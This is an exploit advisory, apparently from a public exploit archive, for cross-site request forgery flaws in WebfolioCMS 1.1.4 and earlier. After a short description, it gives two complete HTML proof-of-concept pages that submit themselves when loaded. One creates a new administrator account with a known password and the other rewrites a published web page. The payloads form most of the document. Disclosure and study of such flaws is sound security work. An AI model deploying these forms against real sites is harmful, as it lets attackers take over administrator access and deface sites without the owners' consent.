@@ -1,0 +1,62 @@
++--------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title    : WebfolioCMS <= 1.1.4 CSRF (Add Admin/Modify Pages)
+# Date             : 28-02-2012
+# Author           : Ivano Binetti (http://ivanobinetti.com)
+# Software link    : http://sourceforge.net/projects/webfolio-cms/files/WebfolioCMS-1.1.4.zip/download
+# Vendor site      : http://webfolio-cms.sourceforge.net/
+# Version          : 1.1.4 and lower 
+# Tested on        : Debian Squeeze (6.0) 
+# Original Advisory: http://ivanobinetti.blogspot.com/2012/02/webfoliocms-114-csrf-add-adminmodify.html
++--------------------------------------------------------------------------------------------------------------------------------+
++------------------------------------------[CSRF Vulnerabilities by Ivano Binetti]-----------------------------------------------+
+
+Summary
+1)Introduction
+2)Vulnerabilities Description
+3)Exploit
+  3.1 Add Administrator 
+  3.2 Modify Web Page 
++--------------------------------------------------------------------------------------------------------------------------------+
+1)Introduction
+Webfolio CMS "is a free, open-source, customized content management system, whose main purpose is creation of web sites for 
+presenting someone's work, and portfolio-like websites".
+
+2)Vulnerabilities Description
+WebfolioCMS 1.1.4 (and lower) is affected by a CSRF Vulnerability which allows an attacker to add a new administrator, modify a 
+web pages, and change may any other WebfolioCMS's parameter. In this document I will demonstrate how to add an 
+administrator account and how to modify an existing and published web pages. other parameters can be modified with little changes.
+
+3)Exploit 
+ 3.1 Add Administrator
+ <html>
+ <body onload="javascript:document.forms[0].submit()">
+ <H2>CSRF Exploit to add ADMIN account</H2>
+ <form method="POST" name="form0" action="http://<webfolio_ip>:80/admin/users/add ">
+ <input type="hidden" name="user[username]" value="new_admin"/>
+ <input type="hidden" name="user[email]" value="admin@admin.com"/>
+ <input type="hidden" name="user_meta[firstName]" value="admin_firstname"/>
+ <input type="hidden" name="user_meta[lastName]" value="admin_lastname"/>
+ <input type="hidden" name="user[password]" value="password"/>
+ <input type="hidden" name="re_password" value="password"/>
+ <input type="hidden" name="user[groupId]" value="1"/>
+ <input type="hidden" name="add" value="Add"/>
+ </form>
+ </body>
+ </html>
+
+  
+  3.2 Modify Web Page 
+  <html>
+  <body onload="javascript:document.forms[0].submit()">
+  <H2>CSRF Exploit to Modify published web page</H2>
+  <form method="POST" name="form0" action="http://<webfolio_ip>:80/admin/pages/edit/web_page_name">
+  <input type="hidden" name="title" value="new_title"/>
+  <input type="hidden" name="text" value="new_text"/>
+  <input type="hidden" name="id" value="1"/>
+  <input type="hidden" name="titleUrlFormat" value="test"/>
+  <input type="hidden" name="save" value="Save"/>
+  </form>
+  </body>
+  </html>
++--------------------------------------------------------------------------------------------------------------------------------+
+  
